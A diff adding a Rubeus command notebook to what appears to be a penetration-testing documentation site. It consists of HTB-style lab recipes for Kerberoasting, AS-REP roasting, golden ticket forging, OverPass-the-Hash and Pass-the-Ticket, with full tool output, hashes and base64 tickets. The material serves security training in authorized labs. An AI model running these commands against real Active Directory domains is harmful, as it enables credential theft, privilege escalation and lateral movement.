@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=rubeus) · [All tools](/index)
+
 ## Commands
 
 **Windows PowerShell**
@@ -24,8 +26,498 @@ Kerberoasting requests tickets; use the authorized lab scope.
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=Rubeus)
+## Notebook recipes
 
-## Learning and original examples
+24 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Rubeus — Find a Kerberos Task](/tools/rubeus)
+<AccordionGroup>
+
+<Accordion title="Kerberoasting with Rubeus">
+
+### Kerberoasting with Rubeus
+
+**ACL Abuse Tactics**
+
+```powershell
+PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target User            : adunn
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : adunn
+[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+[*] ServicePrincipalName   : notahacker/LEGIT
+[*] PwdLastSet             : 3/1/2022 11:29:08 AM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$ <SNIP>
+```
+
+</Accordion>
+
+<Accordion title="Creating a Golden Ticket using Rubeus">
+
+### Creating a Golden Ticket using Rubeus
+
+**Child to Parent Trusts - Windows**
+
+```powershell
+PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: Build TGT
+
+[*] Building PAC
+
+[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
+[*] SID            : S-1-5-21-2806153819-209893948-922872689
+[*] UserId         : 500
+[*] Groups         : 520,512,513,519,518
+[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519
+[*] ServiceKey     : 9D765B482771505CBE97411065964D5F
+[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
+[*] KDCKey         : 9D765B482771505CBE97411065964D5F
+[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
+[*] Service        : krbtgt
+[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL
+
+[*] Generating EncTicketPart
+[*] Signing PAC
+[*] Encrypting EncTicketPart
+[*] Generating Ticket
+[*] Generated KERB-CRED
+[*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'
+
+[*] AuthTime       : 3/29/2022 10:06:41 AM
+[*] StartTime      : 3/29/2022 10:06:41 AM
+[*] EndTime        : 3/29/2022 8:06:41 PM
+[*] RenewTill      : 4/5/2022 10:06:41 AM
+
+[*] base64(ticket.kirbi):
+      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoR8bHUxPR0lTVElDUy5JTkxBTkVG
+      UkVJR0hULkxPQ0FMojIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5M
+      T0NBTKOCBDIwggQuoAMCARehAwIBA6KCBCAEggQc0u5onpWKAP0Hw0KJuEOAFp8OgfBXlkwH3sXu5BhH
+      T3zO/Ykw2Hkq2wsoODrBj0VfvxDNNpvysToaQdjHIqIqVQ9kXfNHM7bsQezS7L1KSx++2iX94uRrwa/S
+      VfgHhAuxKPlIi2phwjkxYETluKl26AUo2+WwxDXmXwGJ6LLWN1W4YGScgXAX+Kgs9xrAqJMabsAQqDfy
+      k7+0EH9SbmdQYqvAPrBqYEnt0mIPM9cakei5ZS1qfUDWjUN4mxsqINm7qNQcZHWN8kFSfAbqyD/OZIMc
+      g78hZ8IYL+Y4LPEpiQzM8JsXqUdQtiJXM3Eig6RulSxCo9rc5YUWTaHx/i3PfWqP+dNREtldE2sgIUQm
+      9f3cO1aOCt517Mmo7lICBFXUTQJvfGFtYdc01fWLoN45AtdpJro81GwihIFMcp/vmPBlqQGxAtRKzgzY
+      acuk8YYogiP6815+x4vSZEL2JOJyLXSW0OPhguYSqAIEQshOkBm2p2jahQWYvCPPDd/EFM7S3NdMnJOz
+      X3P7ObzVTAPQ/o9lSaXlopQH6L46z6PTcC/4GwaRbqVnm1RU0O3VpVr5bgaR+Nas5VYGBYIHOw3Qx5YT
+      3dtLvCxNa3cEgllr9N0BjCl1iQGWyFo72JYI9JLV0VAjnyRxFqHztiSctDExnwqWiyDaGET31PRdEz+H
+      WlAi4Y56GaDPrSZFS1RHofKqehMQD6gNrIxWPHdS9aiMAnhQth8GKbLqimcVrCUG+eghE+CN999gHNMG
+      Be1Vnz8Oc3DIM9FNLFVZiqJrAvsq2paakZnjf5HXOZ6EdqWkwiWpbGXv4qyuZ8jnUyHxavOOPDAHdVeo
+      /RIfLx12GlLzN5y7132Rj4iZlkVgAyB6+PIpjuDLDSq6UJnHRkYlJ/3l5j0KxgjdZbwoFbC7p76IPC3B
+      aY97mXatvMfrrc/Aw5JaIFSaOYQ8M/frCG738e90IK/2eTFZD9/kKXDgmwMowBEmT3IWj9lgOixNcNV/
+      OPbuqR9QiT4psvzLGmd0jxu4JSm8Usw5iBiIuW/pwcHKFgL1hCBEtUkaWH24fuJuAIdei0r9DolImqC3
+      sERVQ5VSc7u4oaAIyv7Acq+UrPMwnrkDrB6C7WBXiuoBAzPQULPTWih6LyAwenrpd0sOEOiPvh8NlvIH
+      eOhKwWOY6GVpVWEShRLDl9/XLxdnRfnNZgn2SvHOAJfYbRgRHMWAfzA+2+xps6WS/NNf1vZtUV/KRLlW
+      sL5v91jmzGiZQcENkLeozZ7kIsY/zadFqVnrnQqsd97qcLYktZ4yOYpxH43JYS2e+cXZ+NXLKxex37HQ
+      F5aNP7EITdjQds0lbyb9K/iUY27iyw7dRVLz3y5Dic4S4+cvJBSz6Y1zJHpLkDfYVQbBUCfUps8ImJij
+      Hf+jggEhMIIBHaADAgEAooIBFASCARB9ggEMMIIBCKCCAQQwggEAMIH9oBswGaADAgEXoRIEEBrCyB2T
+      JTKolmppTTXOXQShHxsdTE9HSVNUSUNTLklOTEFORUZSRUlHSFQuTE9DQUyiEzARoAMCAQGhCjAIGwZo
+      YWNrZXKjBwMFAEDgAACkERgPMjAyMjAzMjkxNzA2NDFapREYDzIwMjIwMzI5MTcwNjQxWqYRGA8yMDIy
+      MDMzMDAzMDY0MVqnERgPMjAyMjA0MDUxNzA2NDFaqB8bHUxPR0lTVElDUy5JTkxBTkVGUkVJR0hULkxP
+      Q0FMqTIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5MT0NBTA==
+
+[+] Ticket successfully imported!
+```
+
+</Accordion>
+
+<Accordion title="Performing a Kerberoasting Attacking with Rubeus Using /domain Flag">
+
+### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
+
+**Cross-Forest Trusts - Windows**
+
+```powershell
+PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target User            : mssqlsvc
+[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+[*] SamAccountName         : mssqlsvc
+[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
+[*] PwdLastSet             : 3/24/2022 12:47:52 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$<SNIP>
+```
+
+</Accordion>
+
+<Accordion title="Limit Results with an LDAP Filter">
+
+### Limit Results with an LDAP Filter
+
+**Kerberoasting from Windows**
+
+```powershell
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```
+
+</Accordion>
+
+<Accordion title="Quick Reference">
+
+### Quick Reference
+
+**Kerberoasting from Windows**
+
+```powershell
+# Request a ticket for one SPN
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
+
+# PowerView enumeration and ticket request
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
+
+# Rubeus statistics and a targeted request
+.\Rubeus.exe kerberoast /stats
+.\Rubeus.exe kerberoast /user:<USER> /nowrap
+```
+
+</Accordion>
+
+<Accordion title="Show Kerberoastable Account Statistics">
+
+### Show Kerberoastable Account Statistics
+
+**Kerberoasting from Windows**
+
+```powershell
+.\Rubeus.exe kerberoast /stats
+```
+
+</Accordion>
+
+<Accordion title="Target One User">
+
+### Target One User
+
+**Kerberoasting from Windows**
+
+```powershell
+.\Rubeus.exe kerberoast /user:testspn /nowrap
+```
+
+</Accordion>
+
+<Accordion title="Write Results to a File">
+
+### Write Results to a File
+
+**Kerberoasting from Windows**
+
+```powershell
+.\Rubeus.exe kerberoast /outfile:hashes.txt
+```
+
+</Accordion>
+
+<Accordion title="Kerberoasting: Quick Reference">
+
+### Kerberoasting: Quick Reference
+
+**Kerberoasting: Quick Reference**
+
+```powershell
+# Windows (Rubeus)
+Rubeus.exe kerberoast /outfile:kerb.hash
+```
+
+</Accordion>
+
+<Accordion title="Unconstrained">
+
+### Unconstrained
+
+**Kerberos Delegation: Quick Reference**
+
+```bash
+Rubeus.exe monitor /interval:5
+# then coerce: PrinterBug / PetitPotam against the DC
+```
+
+</Accordion>
+
+<Accordion title="Retrieving AS-REP in Proper Format using Rubeus">
+
+### Retrieving AS-REP in Proper Format using Rubeus
+
+**Miscellaneous Misconfigurations**
+
+```powershell
+PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: AS-REP roasting
+
+[*] Target User            : mmorgan
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))'
+[*] SamAccountName         : mmorgan
+[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
+[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\mmorgan'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+     $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55$0978822DEC13046712DB7DC03F6C4DE059A946485451AAE98BB93DFF8E3E64F3AA5614160F21A029C2B9437CB16E5E9DA4A2870FEC0596B09BADA989D1F8057262EA40840E8D0F20313B4E9A40FA5E4F987FF404313227A7BFFAE748E07201369D48ABB4727DFE1A9F09D50D7EE3AA5C13E4433E0F9217533EE0E74B02EB8907E13A208340728F794ED5103CB3E5C7915BF2F449AFDA41988FF48A356BF2BE680A25931A8746A99AD3E757BFE097B852F72CEAE1B74720C011CFF7EC94CBB6456982F14DA17213B3B27DFA1AD4C7B5C7120DB0D70763549E5144F1F5EE2AC71DDFC4DCA9D25D39737DC83B6BC60E0A0054FC0FD2B2B48B25C6CA
+```
+
+</Accordion>
+
+<Accordion title="Rubeus — dump tickets (base64)">
+
+### Rubeus — dump tickets (base64)
+
+**Pass the Ticket from Windows**
+
+```cmd
+Rubeus.exe dump /nowrap
+```
+
+</Accordion>
+
+<Accordion title="Step 2a — OverPass-the-Hash / Pass the Key (forge a TGT from a key)">
+
+### Step 2a — OverPass-the-Hash / Pass the Key (forge a TGT from a key)
+
+**Pass the Ticket from Windows**
+
+```cmd
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:julio /aes256:77da7057b42509a1d086f4f58e7252ad673b1940be2f741c496c577d10e4df76 /nowrap
+```
+
+**Pass the Ticket from Windows**
+
+```cmd
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /ptt
+```
+
+</Accordion>
+
+<Accordion title="Step 2b — Inject a stolen/forged ticket (the actual &quot;pass&quot;)">
+
+### Step 2b — Inject a stolen/forged ticket (the actual "pass")
+
+**Pass the Ticket from Windows**
+
+```cmd
+Rubeus.exe ptt /ticket:doIFujCCBba...        # base64 from asktgt/dump
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-...julio@krbtgt-inlanefreight.htb.kirbi   # a .kirbi file
+```
+
+</Accordion>
+
+<Accordion title="Rubeus — Find a Kerberos Task">
+
+### Rubeus — Find a Kerberos Task
+
+**Rubeus — Find a Kerberos Task**
+
+```powershell
+.\Rubeus.exe
+```
+
+**Rubeus — Find a Kerberos Task**
+
+Context from the notebook: Run on:  a Windows lab host, from PowerShell or Command Prompt, in the directory containing  Rubeus.exe .
+
+```text
+Rubeus.exe
+```
+
+</Accordion>
+
+<Accordion title="Key Takeaways">
+
+### Key Takeaways
+
+**Pass the Ticket from Windows**
+
+Context from the notebook: OverPass-the-Hash / Pass the Key  bridges hash→Kerberos: turn a stolen NT hash or  AES key  into a real TGT ( Rubeus asktgt  / Mimikatz  sekurlsa::pth ).  Prefer AES  over RC4 for opsec.
+
+```text
+Rubeus asktgt
+```
+
+**Pass the Ticket from Windows**
+
+Context from the notebook: Dump with  sekurlsa::tickets /export ,  sekurlsa::ekeys , or  Rubeus dump /nowrap ; inject with  Rubeus ptt  /  kerberos::ptt ; verify with  klist .
+
+```text
+Rubeus dump /nowrap
+```
+
+**Pass the Ticket from Windows**
+
+Context from the notebook: Dump with  sekurlsa::tickets /export ,  sekurlsa::ekeys , or  Rubeus dump /nowrap ; inject with  Rubeus ptt  /  kerberos::ptt ; verify with  klist .
+
+```text
+Rubeus ptt
+```
+
+</Accordion>
+
+<Accordion title="Where it fits in a pentest">
+
+### Where it fits in a pentest
+
+**Pass the Ticket from Windows**
+
+Context from the notebook: PtT is core  lateral movement  in an AD engagement. Typical chain: land on a box →  sekurlsa::ekeys / tickets  or  Rubeus dump  → grab a privileged user's TGT (or  asktgt  from their key) → inject →  Enter-PSSession / impacket  to the next host or the DC. It's preferred over PtH when the environment is Kerberos-only or you want to stay AES-native and quieter. It also chains from other attacks that  yield  tickets: Kerberoasting, AS-REP roasting, unconstrained delegation, and  Pass the Certificate  (PKINIT → TGT).
+
+```text
+Rubeus dump
+```
+
+</Accordion>
+
+<Accordion title="Common problems">
+
+### Common problems
+
+**Rubeus — Find a Kerberos Task**
+
+Context from the notebook: Executable not found:  check  Get-Location  and  Test-Path .\Rubeus.exe .
+
+```text
+Get-Location
+```
+
+**Rubeus — Find a Kerberos Task**
+
+Context from the notebook: Executable not found:  check  Get-Location  and  Test-Path .\Rubeus.exe .
+
+```text
+Test-Path .\Rubeus.exe
+```
+
+</Accordion>
+
+<Accordion title="Requesting TGT and Performing PTT with DC01$ Machine Account">
+
+### Requesting TGT and Performing PTT with DC01$ Machine Account
+
+**Historical AD Vulnerability Labs · older reference**
+
+```powershell
+PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'INLANEFREIGHT.LOCAL\ACADEMY-EA-DC01$'
+[*] Using domain controller: 172.16.5.5:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+ doIGUDCCBkygAwIBBaEDAgEWooIFSDCCBURhggVAMIIFPKADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
+      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggTyMIIE7qADAgEXoQMC
+      AQKiggTgBIIE3IHVcI8Q7gEgvqZmbo2BFOclIQogbXr++rtdBdgL5MPlU2V15kXxx4vZaBRzBv6/e3MC
+      exXtfUDZce8olUa1oy901BOhQNRuW0d9efigvnpL1fz0QwgLC0gcGtfPtQxJLTpLYWcDyViNdncjj76P
+      IZJzOTbSXT1bNVFpM9YwXa/tYPbAFRAhr0aP49FkEUeRVoz2HDMre8gfN5y2abc5039Yf9zjvo78I/HH
+      NmLWni29T9TDyfmU/xh/qkldGiaBrqOiUqC19X7unyEbafC6vr9er+j77TlMV88S3fUD/f1hPYMTCame
+      svFXFNt5VMbRo3/wQ8+fbPNDsTF+NZRLTAGZOsEyTfNEfpw1nhOVnLKrPYyNwXpddOpoD58+DCU90FAZ
+      g69yH2enKv+dNT84oQUxE+9gOFwKujYxDSB7g/2PUsfUh7hKhv3OkjEFOrzW3Xrh98yHrg6AtrENxL89
+      CxOdSfj0HNrhVFgMpMepPxT5Sy2mX8WDsE1CWjckcqFUS6HCFwAxzTqILbO1mbNO9gWKhMPwyJDlENJq
+      WdmLFmThiih7lClG05xNt56q2EY3y/m8Tpq8nyPey580TinHrkvCuE2hLeoiWdgBQiMPBUe23NRNxPHE
+      PjrmxMU/HKr/BPnMobdfRafgYPCRObJVQynOJrummdx5scUWTevrCFZd+q3EQcnEyRXcvQJFDU3VVOHb
+      Cfp+IYd5AXGyIxSmena/+uynzuqARUeRl1x/q8jhRh7ibIWnJV8YzV84zlSc4mdX4uVNNidLkxwCu2Y4
+      K37BE6AWycYH7DjZEzCE4RSeRu5fy37M0u6Qvx7Y7S04huqy1Hbg0RFbIw48TRN6qJrKRUSKep1j19n6
+      h3hw9z4LN3iGXC4Xr6AZzjHzY5GQFaviZQ34FEg4xF/Dkq4R3abDj+RWgFkgIl0B5y4oQxVRPHoQ+60n
+      CXFC5KznsKgSBV8Tm35l6RoFN5Qa6VLvb+P5WPBuo7F0kqUzbPdzTLPCfx8MXt46Jbg305QcISC/QOFP
+      T//e7l7AJbQ+GjQBaqY8qQXFD1Gl4tmiUkVMjIQrsYQzuL6D3Ffko/OOgtGuYZu8yO9wVwTQWAgbqEbw
+      T2xd+SRCmElUHUQV0eId1lALJfE1DC/5w0++2srQTtLA4LHxb3L5dalF/fCDXjccoPj0+Q+vJmty0XGe
+      +Dz6GyGsW8eiE7RRmLi+IPzL2UnOa4CO5xMAcGQWeoHT0hYmLdRcK9udkO6jmWi4OMmvKzO0QY6xuflN
+      hLftjIYfDxWzqFoM4d3E1x/Jz4aTFKf4fbE3PFyMWQq98lBt3hZPbiDb1qchvYLNHyRxH3VHUQOaCIgL
+      /vpppveSHvzkfq/3ft1gca6rCYx9Lzm8LjVosLXXbhXKttsKslmWZWf6kJ3Ym14nJYuq7OClcQzZKkb3
+      EPovED0+mPyyhtE8SL0rnCxy1XEttnusQfasac4Xxt5XrERMQLvEDfy0mrOQDICTFH9gpFrzU7d2v87U
+      HDnpr2gGLfZSDnh149ZVXxqe9sYMUqSbns6+UOv6EW3JPNwIsm7PLSyCDyeRgJxZYUl4XrdpPHcaX71k
+      ybUAsMd3PhvSy9HAnJ/tAew3+t/CsvzddqHwgYBohK+eg0LhMZtbOWv7aWvsxEgplCgFXS18o4HzMIHw
+      oAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagGzAZoAMCARehEgQQd/AohN1w1ZZXsks8cCUlbqEVGxNJ
+      TkxBTkVGUkVJR0hULkxPQ0FMoh0wG6ADAgEBoRQwEhsQQUNBREVNWS1FQS1EQzAxJKMHAwUAQOEAAKUR
+      GA8yMDIyMDMzMDIyNTAyNVqmERgPMjAyMjAzMzEwODUwMjVapxEYDzIwMjIwNDA2MjI1MDI1WqgVGxNJ
+      TkxBTkVGUkVJR0hULkxPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNJTkxBTkVGUkVJR0hULkxPQ0FM
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
+  ServiceRealm             :  INLANEFREIGHT.LOCAL
+  UserName                 :  ACADEMY-EA-DC01$
+  UserRealm                :  INLANEFREIGHT.LOCAL
+  StartTime                :  3/30/2022 3:50:25 PM
+  EndTime                  :  3/31/2022 1:50:25 AM
+  RenewTill                :  4/6/2022 3:50:25 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  d/AohN1w1ZZXsks8cCUlbg==
+  ASREP (key)              :  2A621F62C32241F38FA68826E95521DD
+```
+
+</Accordion>
+
+</AccordionGroup>
